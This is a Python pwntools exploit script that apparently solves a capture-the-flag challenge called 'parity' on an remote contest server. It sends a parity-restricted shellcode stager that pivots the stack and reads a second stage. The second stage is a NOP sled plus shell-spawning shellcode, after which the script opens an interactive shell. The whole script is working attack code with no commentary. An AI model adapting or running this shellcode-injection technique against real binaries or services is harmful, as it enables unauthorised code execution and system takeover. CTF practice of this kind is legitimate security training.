#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'challs.actf.co', 31226
binary = './parity'
brkpts = '''
b*0x4012f5
c
'''

elf = ELF("parity")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

if __name__ == "__main__":
    sc = """
        push 0x7f
        pop rdx
        pop rbx
        pop rsp
        pop rbx
        nop
        pop rbx
        nop
        pop rbx
        nop
        pop rbx
        push 0x5
        nop
        pop rbx
        nop
        pop rbx
        nop
        pop rbx
        nop
        pop rbx
        nop
        .byte 0xf
    """

    s(asm(sc))

    sleep(1)

    sc2 = asm("""
    push 0x404050
    pop rsp
    """) + "\xeb\x20" + "\x90"*0x20 + asm(shellcraft.sh())

    print(len(sc2))
    sl("\x90"*0x1a + sc2)
    io.interactive()
